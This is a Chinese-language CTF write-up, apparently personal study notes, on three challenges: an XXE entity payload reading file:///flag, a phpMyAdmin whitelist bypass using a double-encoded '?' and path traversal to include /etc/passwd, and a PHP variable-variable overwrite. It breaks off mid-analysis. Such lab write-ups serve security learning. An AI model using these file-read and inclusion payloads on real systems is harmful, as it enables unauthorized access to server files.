## [NCTF2019]Fake XML cookbook

### ![image-20240429201754032](C:\Users\86182\AppData\Roaming\Typora\typora-user-images\image-20240429201754032.png)

抓包发现

![image-20240429201833095](C:\Users\86182\AppData\Roaming\Typora\typora-user-images\image-20240429201833095.png)

那就发现是有标签，xxe漏洞：

### 知识点：xxe漏洞有回显

![](C:\Users\86182\Pictures\Screenshots\屏幕截图 2024-04-29 200717.png)

<?xml version="1.0"?>

<!DOCTYPE ANY [
  <!ENTITY admin SYSTEM "file:///flag">
  ]>
(下面这是题目自带的)
<user>&asdadw;</user><password>sdhaf</password>

基本格式将标签实例化,&的使用使得可以引用<!ENTITY admin SYSTEM "file:///flag">这句话，可以进行文件读取，一般是抓包时发现标签是可以使用

![image-20240429202421651](C:\Users\86182\AppData\Roaming\Typora\typora-user-images\image-20240429202421651.png)

## [GWCTF 2019]我有一个数据库

问题在index.php的55~63:



```php
// If we have a valid target, let's load that script instead
if (! empty($_REQUEST['target'])
    && is_string($_REQUEST['target'])
    && ! preg_match('/^index/', $_REQUEST['target'])
    && ! in_array($_REQUEST['target'], $target_blacklist)
    && Core::checkPageValidity($_REQUEST['target'])
) {
    include $_REQUEST['target'];
    exit;
}
```

这里对于参数共有5个判断，判断通过就可以通过Include包含文件。
 前面3个判断基本可以忽略，后两个：
 $target_blacklist:



```php
$target_blacklist = array (
    'import.php', 'export.php'
);
```

Core::checkPageValidity($_REQUEST['target']):
 代码在libraries\classes\Core.php的443~476：



```php
    public static function checkPageValidity(&$page, array $whitelist = [])
    {
        if (empty($whitelist)) {
            $whitelist = self::$goto_whitelist;
        }
        if (! isset($page) || !is_string($page)) {
            return false;
        }

        if (in_array($page, $whitelist)) {
            return true;
        }

        $_page = mb_substr(
            $page,
            0,
            mb_strpos($page . '?', '?')
        );
        if (in_array($_page, $whitelist)) {
            return true;
        }

        $_page = urldecode($page);
        $_page = mb_substr(
            $_page,
            0,
            mb_strpos($_page . '?', '?')
        );
        if (in_array($_page, $whitelist)) {
            return true;
        }

        return false;
    }
```

这里验证白名单：



```php
public static $goto_whitelist = array(
        'db_datadict.php',
        'db_sql.php',
        'db_events.php',
        'db_export.php',
        'db_importdocsql.php',
        'db_multi_table_query.php',
        'db_structure.php',
        'db_import.php',
        'db_operations.php',
        'db_search.php',
        'db_routines.php',
        'export.php',
        'import.php',
        'index.php',
        'pdf_pages.php',
        'pdf_schema.php',
        'server_binlog.php',
        'server_collations.php',
        'server_databases.php',
        'server_engines.php',
        'server_export.php',
        'server_import.php',
        'server_privileges.php',
        'server_sql.php',
        'server_status.php',
        'server_status_advisor.php',
        'server_status_monitor.php',
        'server_status_queries.php',
        'server_status_variables.php',
        'server_variables.php',
        'sql.php',
        'tbl_addfield.php',
        'tbl_change.php',
        'tbl_create.php',
        'tbl_import.php',
        'tbl_indexes.php',
        'tbl_sql.php',
        'tbl_export.php',
        'tbl_operations.php',
        'tbl_structure.php',
        'tbl_relation.php',
        'tbl_replace.php',
        'tbl_row_action.php',
        'tbl_select.php',
        'tbl_zoom_select.php',
        'transformation_overview.php',
        'transformation_wrapper.php',
        'user_password.php',
    );
```

之后phpMyAdmin的开发团队考虑到了target后面加参数的情况，通过字符串分割将问号的前面部分取出，继续匹配白名单，然后经过一遍urldecode后再重复动作。
 所以这里我们可以选取白名单里的任意一个页面。
 构造:

?经过两次url编码变成%253f绕过验证

```undefined
target=db_datadict.php%253f/../../../../../../../../etc/passwd
```

绕过所有的检查。
 最后在include包含文件时，斜杠前面的部分包括问号会被当作文件名。
 ps:如果是linux系统下，就更简单了，直接通过问号截断就行了。

最后将/etc/passwd换成/flag

得到flag

## [BJDCTF2020]Mark loves cat

F12，抓包发包，dirsearch扫描，githack下文件。/.git源码泄露

发现源码下面还有

<?php

include 'flag.php';

$yds = "dog";
$is = "cat";
$handsome = 'yds';

foreach($_POST as $x => $y){
    $$x = $y;
}

foreach($_GET as $x => $y){
    $$x = $$y;
}

foreach($_GET as $x => $y){
    if($_GET['flag'] === $x && $x !== 'flag'){
        exit($handsome);
    }
}

if(!isset($_GET['flag']) && !isset($_POST['flag'])){
    exit($yds);
}

if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){
    exit($is);
}

发现这个文件，开始构建参数代码审计：

关键点（不一定一定是那个最后的才能起作用）：

1.直接foreach($_GET as $x => $y){    if($_GET['flag'] === $x && $x !== 'flag'){  //不能同时 flag的值等于某个键名，那个键值又是flag        exit($handsome);    } }利用这句话，可以知道是?flag=a&a=flag

现在就是$handsome等于不等于$flag